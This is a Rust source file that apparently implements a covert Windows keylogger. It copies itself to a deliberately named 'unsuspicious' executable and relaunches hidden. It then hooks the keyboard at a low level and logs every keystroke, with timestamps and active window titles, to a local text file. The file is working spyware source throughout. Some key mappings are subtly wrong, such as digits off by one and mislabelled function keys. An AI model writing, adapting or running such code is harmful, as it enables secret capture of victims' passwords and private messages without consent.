extern crate widestring;
#[cfg(windows)]
extern crate winapi;

mod lib;
use lib::{append_file, close_handle, copy_self_to_path, create_file};
use std::ffi::CString;
use std::ptr::null_mut;
use winapi::shared::minwindef::{FALSE, LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::{HHOOK, HWND, POINT};
use winapi::um::minwinbase::SYSTEMTIME;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::sysinfoapi::GetLocalTime;
use winapi::um::winbase::{CREATE_NO_WINDOW, STARTF_USESHOWWINDOW};
use winapi::um::winuser::{
    CallNextHookEx, DispatchMessageW, GetForegroundWindow, GetKeyState, GetMessageW,
    GetWindowTextA, PostQuitMessage, SetWindowsHookExW, TranslateMessage, UnhookWindowsHookEx,
    HC_ACTION, KBDLLHOOKSTRUCT, MSG, SW_HIDE, VK_ADD, VK_BACK, VK_CANCEL, VK_CAPITAL, VK_CLEAR,
    VK_CONTROL, VK_DECIMAL, VK_DELETE, VK_DIVIDE, VK_DOWN, VK_END, VK_ESCAPE, VK_F1, VK_F10,
    VK_F11, VK_F12, VK_F13, VK_F14, VK_F15, VK_F16, VK_F17, VK_F18, VK_F19, VK_F2, VK_F20, VK_F21,
    VK_F22, VK_F23, VK_F24, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_HELP, VK_HOME,
    VK_INSERT, VK_LCONTROL, VK_LEFT, VK_LSHIFT, VK_LWIN, VK_MENU, VK_MULTIPLY, VK_NEXT, VK_NUMLOCK,
    VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7,
    VK_NUMPAD8, VK_NUMPAD9, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7,
    VK_OEM_CLEAR, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_PLUS, VK_PAUSE, VK_PLAY,
    VK_PRINT, VK_PRIOR, VK_RCONTROL, VK_RETURN, VK_RIGHT, VK_RSHIFT, VK_RWIN, VK_SCROLL, VK_SELECT,
    VK_SEPARATOR, VK_SHIFT, VK_SLEEP, VK_SNAPSHOT, VK_SPACE, VK_SUBTRACT, VK_TAB, VK_UP, VK_ZOOM,
    WH_KEYBOARD_LL, WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN,
};

pub struct Window {
    last_window: HWND,
}
static mut WINDOW: Window = Window {
    last_window: null_mut(),
};
fn main() {
    let file_exist = unsafe {
        winapi::um::fileapi::GetFileAttributesA(
            CString::new("D:\\unsuspicious_file.exe").unwrap().as_ptr(),
        )
    };

    if file_exist == 0x20 {
        // file exist, execute executable!
        let keyboard_hook =
            unsafe { SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_procedure), null_mut(), 0) };
        let log_file = create_file("D:\\unsuspicious_log.txt").unwrap();
        close_handle(log_file).unwrap();
        let mut message: MSG = MSG {
            hwnd: null_mut(),
            message: 0,
            wParam: 0,
            lParam: 0,
            time: 0,
            pt: POINT { x: 0, y: 0 },
        };
        unsafe {
            while GetMessageW(&mut message, null_mut(), 0, 0) > 0 {
                TranslateMessage(&message);
                DispatchMessageW(&message);
            }
        }
        unhook_keyboard(keyboard_hook);
    } else if file_exist == 0xffffffff {
        // file does not exist yet, create new executable there
        copy_self_to_path("D:\\unsuspicious_file.exe");
        let mut start_up_info: STARTUPINFOA = STARTUPINFOA {
            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
            lpReserved: null_mut(),
            lpDesktop: null_mut(),
            lpTitle: null_mut(), // not create a window so we should not use a title name
            dwX: 0,              // ignore
            dwY: 0,              // ignore
            dwXSize: 0,          // ignore
            dwYSize: 0,
            dwXCountChars: 0,
            dwYCountChars: 0,
            dwFillAttribute: 0,
            dwFlags: STARTF_USESHOWWINDOW,
            wShowWindow: SW_HIDE as u16,
            cbReserved2: 0,
            lpReserved2: null_mut(),
            hStdInput: null_mut(),
            hStdOutput: null_mut(),
            hStdError: null_mut(),
        };

        let mut process_info: PROCESS_INFORMATION = PROCESS_INFORMATION {
            hProcess: null_mut(),
            hThread: null_mut(),
            dwProcessId: 0,
            dwThreadId: 0,
        };

        unsafe {
            CreateProcessA(
                CString::new("D:\\unsuspicious_file.exe").unwrap().as_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                FALSE,
                CREATE_NO_WINDOW,
                null_mut(),
                null_mut(),
                &mut start_up_info,
                &mut process_info,
            )
        };
        if process_info.hThread != null_mut() {
            close_handle(process_info.hThread).unwrap();
        }

        if process_info.hProcess != null_mut() {
            close_handle(process_info.hProcess).unwrap();
        }
    }
}

fn unhook_keyboard(handle: HHOOK) {
    unsafe { UnhookWindowsHookEx(handle) };
    std::process::exit(0);
}
/// Hook procedure for keyboard
/// Check if Caps and shift is pressured and record the keystrokes accordingly
unsafe extern "system" fn hook_procedure(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    let mut log: String = String::from("");
    let mut caps = false;
    let mut shift = false;
    let caps_key_state: i16 = GetKeyState(VK_CAPITAL);
    if caps_key_state > 0 {
        // CAPS is on
        caps = true;
    }

    let p: *mut KBDLLHOOKSTRUCT = std::mem::transmute(l_param as *const KBDLLHOOKSTRUCT);
    let p: KBDLLHOOKSTRUCT = *p;
    if code == HC_ACTION {
        // message ready to be picked up
        if p.vkCode as i32 == VK_LSHIFT || p.vkCode as i32 == VK_RSHIFT {
            // shift key pressed
            let w = w_param as u32;
            match w {
                WM_KEYDOWN => {
                    // SHIFT is on
                    shift = true;
                }
                WM_KEYUP => {
                    // SHIFT is off
                    shift = false;
                }
                _ => {
                    shift = false;
                }
            }
        }

        // start logging
        if w_param as u32 == WM_SYSKEYDOWN || w_param as u32 == WM_KEYDOWN {
            let current_window: HWND = GetForegroundWindow();
            if WINDOW.last_window != current_window {
                // We're in a new window. Log this info
                let mut system_time: SYSTEMTIME = SYSTEMTIME {
                    wYear: 0,
                    wMonth: 0,
                    wDayOfWeek: 0,
                    wDay: 0,
                    wHour: 0,
                    wMinute: 0,
                    wSecond: 0,
                    wMilliseconds: 0,
                };
                GetLocalTime(&mut system_time);
                let day = system_time.wDay;
                let month = system_time.wMonth;
                let year = system_time.wYear;
                let hour = system_time.wHour;
                let min = system_time.wMinute;
                let sec = system_time.wSecond;
                let day_of_week = system_time.wDayOfWeek;

                log.push_str("\n\n[+] Day of the week ");
                log.push_str(&get_day_name(day_of_week));
                log.push_str(" - ");
                log.push_str(&day.to_string());
                log.push_str("/");
                log.push_str(&month.to_string());
                log.push_str("/");
                log.push_str(&year.to_string());
                log.push_str(" - ");
                log.push_str(&hour.to_string());
                log.push_str(":");
                log.push_str(&min.to_string());
                log.push_str(":");
                log.push_str(&sec.to_string());
                log.push_str(" --- ");

                let mut buffer: Vec<u8> = Vec::new();
                for _i in 0..100 {
                    buffer.push(0u8);
                }
                let window_string = CString::from_vec_unchecked(buffer);
                let count = GetWindowTextA(current_window, window_string.as_ptr() as *mut i8, 100);
                log.push_str(&(window_string.into_string().unwrap())[..count as usize]);
                WINDOW.last_window = current_window;
            }
            if p.vkCode != 0 {
                // capture keystroke
                log.push_str("\n Keystroke: ");
                log.push_str(&(hook_code(p.vkCode, caps, shift)));
                log.push_str("\n");
            }
        }
        let mut buffer: Vec<u8> = Vec::new();
        for byte in log.as_bytes().iter() {
            buffer.push(byte.clone());
        }
        // Write to our log file
        append_file("D:\\unsuspicious_log.txt", buffer);
    }
    return CallNextHookEx(null_mut(), code, w_param, l_param);
}

fn get_day_name(day_of_week: u16) -> String {
    match day_of_week {
        1 => {
            return String::from("Monday");
        }
        2 => {
            return String::from("Tuesday");
        }
        3 => {
            return String::from("Wednesday");
        }
        4 => {
            return String::from("Thursday");
        }
        5 => {
            return String::from("Friday");
        }
        6 => {
            return String::from("Saturday");
        }
        0 => {
            return String::from("Sunday");
        }
        _ => {
            return String::from("Unknown day");
        }
    }
}

fn hook_code(code: u32, caps: bool, shift: bool) -> String {
    let key: &str;
    let code = code as i32;
    match code {
        // ASCII character
        0x41 => {
            key = if caps {
                if shift {
                    "a"
                } else {
                    "A"
                }
            } else {
                if shift {
                    "A"
                } else {
                    "a"
                }
            };
        }
        0x42 => {
            key = if caps {
                if shift {
                    "b"
                } else {
                    "B"
                }
            } else {
                if shift {
                    "B"
                } else {
                    "b"
                }
            };
        }
        0x43 => {
            key = if caps {
                if shift {
                    "c"
                } else {
                    "C"
                }
            } else {
                if shift {
                    "C"
                } else {
                    "c"
                }
            };
        }
        0x44 => {
            key = if caps {
                if shift {
                    "d"
                } else {
                    "D"
                }
            } else {
                if shift {
                    "D"
                } else {
                    "d"
                }
            };
        }
        0x45 => {
            key = if caps {
                if shift {
                    "e"
                } else {
                    "E"
                }
            } else {
                if shift {
                    "E"
                } else {
                    "e"
                }
            };
        }
        0x46 => {
            key = if caps {
                if shift {
                    "f"
                } else {
                    "F"
                }
            } else {
                if shift {
                    "F"
                } else {
                    "f"
                }
            };
        }
        0x47 => {
            key = if caps {
                if shift {
                    "g"
                } else {
                    "G"
                }
            } else {
                if shift {
                    "G"
                } else {
                    "g"
                }
            };
        }
        0x48 => {
            key = if caps {
                if shift {
                    "h"
                } else {
                    "H"
                }
            } else {
                if shift {
                    "H"
                } else {
                    "h"
                }
            };
        }
        0x49 => {
            key = if caps {
                if shift {
                    "i"
                } else {
                    "I"
                }
            } else {
                if shift {
                    "I"
                } else {
                    "i"
                }
            };
        }
        0x4A => {
            key = if caps {
                if shift {
                    "j"
                } else {
                    "J"
                }
            } else {
                if shift {
                    "J"
                } else {
                    "j"
                }
            };
        }
        0x4B => {
            key = if caps {
                if shift {
                    "k"
                } else {
                    "K"
                }
            } else {
                if shift {
                    "K"
                } else {
                    "k"
                }
            };
        }
        0x4C => {
            key = if caps {
                if shift {
                    "l"
                } else {
                    "L"
                }
            } else {
                if shift {
                    "L"
                } else {
                    "l"
                }
            };
        }
        0x4D => {
            key = if caps {
                if shift {
                    "m"
                } else {
                    "M"
                }
            } else {
                if shift {
                    "M"
                } else {
                    "m"
                }
            };
        }
        0x4E => {
            key = if caps {
                if shift {
                    "n"
                } else {
                    "N"
                }
            } else {
                if shift {
                    "N"
                } else {
                    "n"
                }
            };
        }
        0x4F => {
            key = if caps {
                if shift {
                    "o"
                } else {
                    "O"
                }
            } else {
                if shift {
                    "O"
                } else {
                    "o"
                }
            };
        }
        0x50 => {
            key = if caps {
                if shift {
                    "p"
                } else {
                    "P"
                }
            } else {
                if shift {
                    "P"
                } else {
                    "p"
                }
            };
        }
        0x51 => {
            key = if caps {
                if shift {
                    "q"
                } else {
                    "Q"
                }
            } else {
                if shift {
                    "Q"
                } else {
                    "q"
                }
            };
        }
        0x52 => {
            key = if caps {
                if shift {
                    "r"
                } else {
                    "R"
                }
            } else {
                if shift {
                    "R"
                } else {
                    "r"
                }
            };
        }
        0x53 => {
            key = if caps {
                if shift {
                    "s"
                } else {
                    "S"
                }
            } else {
                if shift {
                    "S"
                } else {
                    "s"
                }
            };
        }
        0x54 => {
            key = if caps {
                if shift {
                    "t"
                } else {
                    "T"
                }
            } else {
                if shift {
                    "T"
                } else {
                    "t"
                }
            };
        }
        0x55 => {
            key = if caps {
                if shift {
                    "u"
                } else {
                    "U"
                }
            } else {
                if shift {
                    "U"
                } else {
                    "u"
                }
            };
        }
        0x56 => {
            key = if caps {
                if shift {
                    "v"
                } else {
                    "V"
                }
            } else {
                if shift {
                    "V"
                } else {
                    "v"
                }
            };
        }
        0x57 => {
            key = if caps {
                if shift {
                    "w"
                } else {
                    "W"
                }
            } else {
                if shift {
                    "W"
                } else {
                    "w"
                }
            };
        }
        0x58 => {
            key = if caps {
                if shift {
                    "x"
                } else {
                    "X"
                }
            } else {
                if shift {
                    "X"
                } else {
                    "x"
                }
            };
        }
        0x59 => {
            key = if caps {
                if shift {
                    "y"
                } else {
                    "Y"
                }
            } else {
                if shift {
                    "Y"
                } else {
                    "y"
                }
            };
        }
        0x5A => {
            key = if caps {
                if shift {
                    "z"
                } else {
                    "Z"
                }
            } else {
                if shift {
                    "Z"
                } else {
                    "z"
                }
            };
        }
        VK_SLEEP => {
            key = "[SLEEP]";
        }
        VK_NUMPAD0 => {
            key = "0";
        }
        VK_NUMPAD1 => {
            key = "1";
        }
        VK_NUMPAD2 => {
            key = "2";
        }
        VK_NUMPAD3 => {
            key = "3";
        }
        VK_NUMPAD4 => {
            key = "4";
        }
        VK_NUMPAD5 => {
            key = "5";
        }
        VK_NUMPAD6 => {
            key = "6";
        }
        VK_NUMPAD7 => {
            key = "7";
        }
        VK_NUMPAD8 => {
            key = "8";
        }
        VK_NUMPAD9 => {
            key = "9";
        }
        VK_MULTIPLY => {
            key = "*";
        }
        VK_ADD => {
            key = "+";
        }
        VK_SEPARATOR => {
            key = "-";
        }
        VK_SUBTRACT => {
            key = "-";
        }
        VK_DECIMAL => {
            key = ".";
        }
        VK_DIVIDE => {
            key = "/";
        }
        VK_F1 => {
            key = "[F1]";
        }
        VK_F2 => {
            key = "[F2]";
        }
        VK_F3 => {
            key = "[F3]";
        }
        VK_F4 => {
            key = "[F4]";
        }
        VK_F5 => {
            key = "[F5]";
        }
        VK_F6 => {
            key = "[F6]";
        }
        VK_F7 => {
            key = "[F7]";
        }
        VK_F8 => {
            key = "[F8]";
        }
        VK_F9 => {
            key = "[F9]";
        }
        VK_F10 => {
            key = "[F10]";
        }
        VK_F11 => {
            key = "[F11]";
        }
        VK_F12 => {
            key = "[F12]";
        }
        VK_F13 => {
            key = "[F13]";
        }
        VK_F14 => {
            key = "[F14]";
        }
        VK_F15 => {
            key = "[F15]";
        }
        VK_F16 => {
            key = "[F16]";
        }
        VK_F17 => {
            key = "[F17]";
        }
        VK_F18 => {
            key = "[F18]";
        }
        VK_F19 => {
            key = "[F19]";
        }
        VK_F20 => {
            key = "[F20]";
        }
        VK_F21 => {
            key = "[F22]";
        }
        VK_F22 => {
            key = "[F23]";
        }
        VK_F23 => {
            key = "[F24]";
        }
        VK_F24 => {
            key = "[F25]";
        }

        VK_NUMLOCK => {
            key = "[NUM-LOCK]";
        }
        VK_SCROLL => {
            key = "[SCROLL-LOCK]";
        }
        VK_BACK => {
            key = "[BACK]";
        }
        VK_TAB => {
            key = "[TAB]";
        }
        VK_CLEAR => {
            key = "[CLEAR]";
        }
        VK_RETURN => {
            key = "[ENTER]";
        }
        VK_SHIFT => {
            key = "[SHIFT]";
        }
        VK_CONTROL => {
            key = "[CTRL]";
        }
        VK_MENU => {
            key = "[ALT]";
        }
        VK_PAUSE => {
            key = "[PAUSE]";
        }
        VK_CAPITAL => {
            key = "[CAP-LOCK]";
        }
        VK_ESCAPE => {
            key = "[ESC]";
            unsafe { PostQuitMessage(0) };
        }
        VK_SPACE => {
            key = "[SPACE]";
        }
        VK_PRIOR => {
            key = "[PAGEUP]";
        }
        VK_NEXT => {
            key = "[PAGEDOWN]";
        }
        VK_END => {
            key = "[END]";
        }
        VK_HOME => {
            key = "[HOME]";
        }
        VK_LEFT => {
            key = "[LEFT]";
        }
        VK_UP => {
            key = "[UP]";
        }
        VK_RIGHT => {
            key = "[RIGHT]";
        }
        VK_DOWN => {
            key = "[DOWN]";
        }
        VK_SELECT => {
            key = "[SELECT]";
        }
        VK_PRINT => {
            key = "[PRINT]";
        }
        VK_SNAPSHOT => {
            key = "[PRTSCRN]";
        }
        VK_INSERT => {
            key = "[INS]";
        }
        VK_DELETE => {
            key = "[DEL]";
        }
        VK_HELP => {
            key = "[HELP]";
        }
        // Number Keys with shift
        0x30 => {
            if shift {
                key = "!";
            } else {
                key = "1";
            }
        }
        0x31 => {
            if shift {
                key = "@";
            } else {
                key = "2";
            }
        }
        0x32 => {
            if shift {
                key = "#";
            } else {
                key = "3";
            }
        }
        0x33 => {
            if shift {
                key = "$";
            } else {
                key = "4";
            }
        }
        0x34 => {
            if shift {
                key = "%";
            } else {
                key = "5";
            }
        }
        0x35 => {
            if shift {
                key = "^";
            } else {
                key = "6";
            }
        }
        0x36 => {
            if shift {
                key = "&";
            } else {
                key = "7";
            }
        }
        0x37 => {
            if shift {
                key = "*";
            } else {
                key = "8";
            }
        }
        0x38 => {
            if shift {
                key = "(";
            } else {
                key = "9";
            }
        }
        0x39 => {
            if shift {
                key = ")";
            } else {
                key = "0";
            }
        }
        // Windows Keys
        VK_LWIN => {
            key = "[WIN]";
        }
        VK_RWIN => {
            key = "[WIN]";
        }
        VK_LSHIFT => {
            key = "[SHIFT]";
        }
        VK_RSHIFT => {
            key = "[SHIFT]";
        }
        VK_LCONTROL => {
            key = "[CTRL]";
        }
        VK_RCONTROL => {
            key = "[CTRL]";
        }
        VK_OEM_1 => {
            if shift {
                key = ":";
            } else {
                key = ";";
            }
        }
        VK_OEM_PLUS => {
            if shift {
                key = "+";
            } else {
                key = "=";
            }
        }
        VK_OEM_COMMA => {
            if shift {
                key = "<";
            } else {
                key = ",";
            }
        }
        VK_OEM_MINUS => {
            if shift {
                key = "_";
            } else {
                key = "-";
            }
        }
        VK_OEM_PERIOD => {
            if shift {
                key = ">";
            } else {
                key = ".";
            }
        }
        VK_OEM_2 => {
            if shift {
                key = "?";
            } else {
                key = "/";
            }
        }
        VK_OEM_3 => {
            if shift {
                key = "~";
            } else {
                key = "`";
            }
        }
        VK_OEM_4 => {
            if shift {
                key = "{";
            } else {
                key = "[";
            }
        }
        VK_OEM_5 => {
            if shift {
                key = "\\";
            } else {
                key = "|";
            }
        }
        VK_OEM_6 => {
            if shift {
                key = "}";
            } else {
                key = "]";
            }
        }
        VK_OEM_7 => {
            if shift {
                key = "'";
            } else {
                key = "'";
            }
        }

        // Action Keys
        VK_PLAY => {
            key = "[PLAY]";
        }
        VK_ZOOM => {
            key = "[ZOOM]";
        }
        VK_OEM_CLEAR => {
            key = "[CLEAR]";
        }
        VK_CANCEL => {
            key = "[CTRL-C]";
        }
        _ => {
            key = "[UNKNOWN KEY]";
        }
    }
    return String::from(key);
}
